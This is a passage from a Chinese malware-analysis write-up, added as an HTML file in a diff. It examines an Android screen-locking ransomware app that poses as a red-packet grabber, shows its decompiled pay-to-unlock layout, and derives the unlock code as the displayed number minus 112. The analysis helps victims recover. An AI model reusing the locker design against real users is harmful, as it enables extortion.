+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginTop=&quot;20.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;付&quot; android:textColor=&quot;#ffff000c&quot; android:textSize=&quot;25.0sp&quot; /&gt;
+            &lt;/LinearLayout&gt;
+            &lt;Button android:background=&quot;@drawable/image_5&quot; android:id=&quot;@id/bt&quot; android:layout_height=&quot;200.0dip&quot; android:layout_width=&quot;200.0dip&quot; android:shadowColor=&quot;#ff000000&quot; android:shadowRadius=&quot;2.0&quot; android:textColor=&quot;#ff000000&quot; /&gt;
+            &lt;LinearLayout android:background=&quot;@drawable/bj&quot; android:layout_height=&quot;200.0dip&quot; android:layout_width=&quot;40.0dip&quot; android:orientation=&quot;vertical&quot;&gt;
+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;10.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;即&quot; android:textColor=&quot;#fffa5fea&quot; android:textSize=&quot;25.0sp&quot; /&gt;
+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;10.0dip&quot; android:layout_marginTop=&quot;20.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;可&quot; android:textColor=&quot;#fff351b7&quot; android:textSize=&quot;25.0sp&quot; /&gt;
+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;10.0dip&quot; android:layout_marginTop=&quot;20.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;解&quot; android:textColor=&quot;#ffff3c66&quot; android:textSize=&quot;25.0sp&quot; /&gt;
+                &lt;TextView android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;10.0dip&quot; android:layout_marginTop=&quot;20.0dip&quot; android:layout_width=&quot;wrap_content&quot; android:text=&quot;锁&quot; android:textColor=&quot;#ffff000c&quot; android:textSize=&quot;25.0sp&quot; /&gt;
+            &lt;/LinearLayout&gt;
+        &lt;/LinearLayout&gt;
+    &lt;/LinearLayout&gt;
+&lt;/LinearLayout&gt;
+&lt;/LinearLayout&gt;
+</code></pre>
+
+<p>那么，布局出来了，可以看到是相对应的</p>
+<p><img src="./Image/3.png" /></p>
+<p>你会发现，那个二维码就是按钮，最后输入框在哪？
+把刚刚的布局拷到一个新建的android项目里，然后在AndroidStudio里看看：
+<img src="./Image/8.png" /></p>
+<p>那么布局对应之前，在xml文件里并没有给出死逼代码的显示，而是在java类里设置的，并且可以发现最上面有一个输入框
+那么密码就是死逼代码-112，分析完毕，开始解锁：</p>
+<hr />
+<p>855062-112=854950，那么照准位置输入：</p>
+<p><img src="./Image/9.png" /></p>
+<p>那么解开了！可以看到，锁住你的那个秒抢红包app，那么删掉他即可</p>
+<p><img src="./Image/10.png" /></p>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
